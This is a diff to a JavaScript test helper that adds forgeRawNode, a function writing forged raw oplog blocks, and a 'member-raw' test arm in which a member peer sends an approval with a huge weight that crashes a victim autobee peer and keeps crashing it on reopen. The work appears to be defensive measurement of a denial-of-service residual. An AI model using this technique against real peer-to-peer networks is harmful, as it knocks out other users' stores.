@@ -11,9 +11,11 @@
 // and every peer that reads it runs stock autobee@2.12.1. An outsider's
 // client also asks for an optimistic node and announces its own core over
 // the wakeup protocol (outsiderAppend, announce), which the Bundle never
-// does. Nothing here changes how a victim's autobee behaves: the other
-// helpers only read, and watchApply wraps okf's apply handler, not
-// autobee. Product code never does any of this.
+// does. A client that runs no part of autobee's drain writes the oplog
+// block straight to the core it owns (forgeRawNode). Nothing here changes
+// how a victim's autobee behaves: the other helpers only read, and
+// watchApply wraps okf's apply handler, not autobee. Product code never
+// does any of this.
 //
 // This file is also a child-process entry point (see the end): the G2
 // approval at a huge weight can exhaust a heap, so it runs in a child.
@@ -25,10 +27,20 @@ import { dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 import { randomBytes } from 'node:crypto'
 import { spawn } from 'node:child_process'
+import { createRequire } from 'node:module'
 import { encodeOp } from '../core/index.js'
 import { Bundle, K, tmpDir, pair, until, sleep, converged } from './store-helpers.js'
 
 export { Bundle, K, tmpDir, pair, until, sleep, converged }
+
+// TEST-ONLY deep require, for forgeRawNode alone: the oplog codec of the
+// pinned release, read never written. It encodes the block that a client
+// which runs no part of autobee's drain writes to the core it owns. Nothing
+// in the product imports it (RAILS 22a), and it changes no autobee
+// behaviour on any peer: a victim decodes such a block with the same codec
+// (autobee lib/writers.js:572).
+const abRequire = createRequire(new URL('../store/package.json', import.meta.url))
+const abEncoding = abRequire('autobee/lib/encoding.js')
 
 // Keys are Buffers in this workspace (corestore/hypercore on node).
 export const hex = (k) => Buffer.from(k).toString('hex')
@@ -101,6 +113,61 @@ export async function outsiderAppend(v, path, over = {}) {
   if (!(await until(async () => v.db.local.length > before, 5000, 20))) {
     throw new Error(`OUTSIDER_NODE_UNWRITTEN: the outsider core stays at length ${before}`)
   }
+  return v.db.local.length
+}
+
+/**
+ * Write ONE raw oplog block to the core that `v` owns, and return the new
+ * core length. `over` sets any of `approvals`, `witness`, `links`,
+ * `timestamp`, `hash`, `optimistic` and `value`.
+ *
+ * This models the adversary the security model defines: a client that
+ * bypasses client libraries and appends arbitrary bytes to its own core. It
+ * runs no part of autobee's drain, so two gates of a wrapped `appendLocal`
+ * do not apply to it:
+ *
+ * - the local flush gate, which refuses to flush a node whose links are
+ *   missing (autobee lib/writers.js:641-664),
+ * - and the drain ORDER, which folds a local node (index.js:818) before it
+ *   flushes it to the core (index.js:824). A node that kills the sender's
+ *   own fold therefore never leaves the sender's core, while a block
+ *   written here is durable first and replicates whatever the sender does
+ *   next.
+ *
+ * The block is a legal oplog node of the pinned release, so a receiver
+ * decodes it with stock autobee (lib/writers.js:571-572). Adopted from the
+ * T1 spike (D-003 `forgeRawNode`, which measured the A9 missing-link
+ * variant with it).
+ */
+export async function forgeRawNode(v, over = {}) {
+  await v.db.local.ready()
+  const self = hex(v.db.local.key)
+  const before = v.db.local.length
+  const value =
+    over.value ||
+    encodeOp('create-concept', {
+      path: `raw/${hex(randomBytes(6))}`,
+      type: 'note',
+      clock: [[self, before]],
+      at: Date.now()
+    })
+  await v.db.local.append(
+    abEncoding.encodeOplog({
+      version: abEncoding.OPLOG_VERSION,
+      timestamp: 'timestamp' in over ? over.timestamp : Date.now(),
+      links: over.links ?? [],
+      batch: { start: 0, end: 0 },
+      views: null,
+      trusted: null,
+      witness: over.witness ?? null,
+      approvals: over.approvals ?? null,
+      optimistic: over.optimistic ?? false,
+      value,
+      hash: over.hash ?? null,
+      weightHint: 0,
+      drift: 0
+    })
+  )
   return v.db.local.length
 }
 
@@ -410,9 +477,12 @@ export function runChild(args, ms) {
 //
 //   node okf/test/attack-helpers.js huge-approval <arm> <weight>
 //
-// `arm` is `outsider` (a Bundle that no indexer admitted) or `member` (a
-// key an indexer admitted with add-writer). Adopted from the T1 spike
-// (D-003), which measured both arms.
+// `arm` is `outsider` (a Bundle that no indexer admitted), `member` (a key
+// an indexer admitted with add-writer, appending through autobee) or
+// `member-raw` (the same key, through a client that writes the block to
+// its own core and folds nothing). The first two come from the T1 spike
+// (D-003). `member-raw` separates the sender's own drain order from the
+// residual that a victim pays (D-038 F01).
 // ---------------------------------------------------------------------------
 async function childHugeApprovalOutsider(weight) {
   const rss = () => Math.round(process.memoryUsage().rss / 1048576)
@@ -568,13 +638,117 @@ async function childHugeApprovalMember(weight) {
   }
 }
 
+/**
+ * The member arm of G2 through a client that does not fold (T11 residual,
+ * D-038 F01). The attacker writes the approval block straight to the core
+ * it owns (forgeRawNode), so the block is durable before any fold and the
+ * sender's own drain order no longer gates delivery. The victim is genesis,
+ * on stock autobee, and the result states the order that a residual claim
+ * needs: delivery FIRST, then the victim's failure, then its reopen.
+ *
+ * The reopen can die inside `Bundle.open`: the boot drain folds the stored
+ * block (index.js:620 then :818) before a caller can attach an error
+ * listener, and an EventEmitter 'error' with no listener ends the process.
+ * So this arm installs an uncaughtException handler, prints the result and
+ * exits 0. A lost run would prove nothing.
+ */
+async function childHugeApprovalMemberRaw(weight) {
+  const SET_LIMIT = /Set maximum size exceeded/
+  const rss = () => Math.round(process.memoryUsage().rss / 1048576)
+  const out = { arm: 'member-raw', weight, rssStart: rss() }
+  const peers = {} // filled once the vaults exist, so finish() always reads them
+  let printed = false
+  const finish = () => {
+    if (printed) return
+    printed = true
+    out.errors = { victim: errorsOf(peers.a || {}), member: errorsOf(peers.b || {}) }
+    out.crashed = Object.entries(out.errors)
+      .filter(([, errs]) => errs.some((e) => SET_LIMIT.test(e)))
+      .map(([name]) => name)
+    out.rssEnd = rss()
+    console.log(`CHILD-RESULT ${JSON.stringify(out)}`)
+  }
+  process.on('uncaughtException', (err) => {
+    const msg = err && err.message ? err.message : String(err)
+    out.uncaught = msg
+    if (!out.reopen) out.reopen = { verdict: SET_LIMIT.test(msg) ? 'CRASH-ON-OPEN' : 'UNCAUGHT', error: msg }
+    finish()
+    process.exit(0)
+  })
+
+  const aDir = await tmpDir('g2r-a')
+  const a = quiet(await Bundle.init(aDir)) // genesis, the victim
+  const b = quiet(await Bundle.join(await tmpDir('g2r-b'), a.key)) // the member
+  peers.a = a
+  peers.b = b
+  const named = randomBytes(32) // the key the forged approval names
+  const unpair = pair(a, b)
+  try {
+    const { tag } = await a.createConcept('seed', 'note')
+    out.synced = await until(async () => (await b.update(), (await b.val(K.cMeta(tag))) !== undefined), 20000)
+    await a.writers.add(b.localKey, { indexer: false })
+    out.memberWritable = await until(async () => (await b.update(), b.writable), 20000)
+    out.hash0 = await converged([a, b], 20000)
+
+    // the attack: one raw oplog block, approving a key at `weight`
+    const raw = await timed(() => forgeRawNode(b, { approvals: [{ key: named, weight }] }), 20000)
+    out.rawAppend = raw.status
+    out.rawError = raw.error ?? null
+    out.memberCoreLength = raw.status === 'ok' ? raw.value : null
+
+    // FIRST the positive control: the victim holds the block. No claim
+    // about a victim that never got the attack proves anything.
+    out.delivered =
+      out.memberCoreLength > 0
+        ? await deliveredTo([['a', a]], [{ key: b.localKey, length: out.memberCoreLength }], 20000)
+        : { a: false }
+
+    // THEN the victim's failure, and whether it can still append.
+    out.victimCrashed = await until(() => errorsOf(a).some((e) => SET_LIMIT.test(e)), 120000, 100)
+    out.victimUpdate = (await timed(() => a.update(), 20000)).status
+    out.victimAppends = (await timed(() => timeAppends(a, 'g2r', 2), 30000)).status
+    out.rssAfterFold = rss()
+
+    // THEN the reopen. The block stays in the victim's store either way.
+    unpair()
+    out.closed = (await timed(() => a.close(), 60000)).status
+    const again = quiet(await Bundle.open(aDir))
+    const upd = await timed(() => again.update(), 60000, 'reopen-update')
+    const crashed = await until(() => errorsOf(again).some((e) => SET_LIMIT.test(e)), 20000, 100)
+    const appends = await timed(() => timeAppends(again, 'g2r-reopen', 2), 60000)
+    out.reopen = {
+      verdict: crashed ? 'CRASH-AFTER-OPEN' : appends.status === 'ok' ? 'REOPENED' : 'NO-APPEND',
+      update: upd.status,
+      crashed,
+      appends: appends.status,
+      attackCoreStored: await storedCore(again, b.localKey),
+      errors: errorsOf(again)
+    }
+    await timed(() => again.close(), 60000)
+  } catch (err) {
+    out.error = err && err.message ? err.message : String(err)
+  } finally {
+    unpair()
+    await timed(async () => {
+      await b.close().catch(() => {})
+      await a.close().catch(() => {})
+    }, 60000)
+    finish()
+  }
+}
+
+const ARMS = {
+  outsider: childHugeApprovalOutsider,
+  member: childHugeApprovalMember,
+  'member-raw': childHugeApprovalMemberRaw
+}
+
 if (process.argv[1] && process.argv[1] === fileURLToPath(import.meta.url)) {
   const [, , what, arm = 'outsider', weight = '1000000000'] = process.argv
-  if (what !== 'huge-approval' || (arm !== 'outsider' && arm !== 'member')) {
+  if (what !== 'huge-approval' || !Object.hasOwn(ARMS, arm)) {
     console.error(`unknown child attack ${what} ${arm}`)
     process.exit(2)
   }
-  if (arm === 'member') await childHugeApprovalMember(Number(weight))
-  else await childHugeApprovalOutsider(Number(weight))
+  await ARMS[arm](Number(weight))
   process.exit(0)
 }
